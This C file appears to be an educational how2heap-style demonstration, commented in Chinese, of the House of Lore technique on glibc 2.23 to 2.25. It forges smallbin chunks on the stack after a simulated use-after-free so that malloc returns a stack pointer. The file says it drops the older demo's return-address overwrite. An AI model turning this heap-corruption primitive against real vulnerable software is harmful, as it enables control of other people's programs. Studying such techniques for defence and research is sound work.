/*
 * 手法：House of Lore，直接伪造 smallbin 的双向链表，适用于 glibc
 * 目标为 2.23～2.25，x86-64。
 *
 * 漏洞模型：用一次 UAF 覆盖已经进入 smallbin 的 victim 的 bk 指针。
 * 成功判据：第二次调用 `malloc(0x100)` 时，返回值必须等于栈上 fake_first+0x10。
 *
 * 第一次 smallbin unlink：
 *   victim->bk = fake_first，且 fake_first->fd == victim
 *   => 返回真实的 victim，并把 bin->bk 改成 fake_first
 *
 * 第二次 smallbin unlink：
 *   fake_first->bk = fake_second，且 fake_second->fd == fake_first
 *   => 返回 fake_first 的 user 区
 *
 * 本文件已经删掉了旧 how2heap 示例末尾那种“不管 malloc 返回到哪里，都直接
 * 按栈帧差值 memcpy 改写返回地址”的演示写法，只保留能证明堆管理器原语本身
 * 生效的断言。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define REQUEST_SIZE 0x100

struct fake_chunk {
    uint64_t prev_size;
    uint64_t size;
    uint64_t fd;
    uint64_t bk;
    unsigned char padding[0x100];
};

int main(void)
{
    setbuf(stdout, NULL);

    struct fake_chunk fake_first __attribute__((aligned(16)));
    struct fake_chunk fake_second __attribute__((aligned(16)));
    memset(&fake_first, 0, sizeof(fake_first));
    memset(&fake_second, 0, sizeof(fake_second));

    uint64_t *victim = malloc(REQUEST_SIZE);
    assert(victim != NULL);
    assert(malloc(0x500) != NULL);      /* guard：阻止 victim 与 top 合并。 */

    free(victim);                       /* 先进入 unsorted。 */
    assert(malloc(0x600) != NULL);      /* 无法使用 victim，将其排进 smallbin。 */

    uint64_t victim_chunk = (uint64_t)(victim - 2);
    fake_first.fd = victim_chunk;
    fake_first.bk = (uint64_t)&fake_second;
    fake_second.fd = (uint64_t)&fake_first;

    /* ---------------- 漏洞模拟：覆盖 smallbin victim->bk。 ---------------- */
    victim[1] = (uint64_t)&fake_first;

    void *real_result = malloc(REQUEST_SIZE);
    assert(real_result == victim);

    void *expected = (char *)&fake_first + 0x10;
    void *fake_result = malloc(REQUEST_SIZE);

    assert(fake_result == expected);

    strcpy(fake_result, "LORE_OLD_STACK");
    assert(strcmp((char *)expected, "LORE_OLD_STACK") == 0);
    puts("[+] Lore 2.23～2.25：栈伪块命中");
    return 0;
}
